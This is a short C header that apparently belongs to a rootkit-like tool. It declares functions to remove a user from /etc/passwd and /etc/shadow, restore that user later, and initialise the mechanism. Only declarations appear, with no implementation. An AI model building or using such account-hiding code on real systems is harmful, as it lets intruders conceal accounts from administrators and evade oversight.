#ifndef GHOST_H
#define GHOST_H

#include "sctm.h"

/* hide/show a user in "/etc/passwd" and "/etc/shadow" */

/* remove a user from "/etc/passwd" and "/etc/shadow" */
int ghost(const uid_t uid);

/* initialization */
int ghost_init(void);

/* restore a user in "/etc/passwd" and "/etc/shadow" */
int unghost(const uid_t uid);

#endif

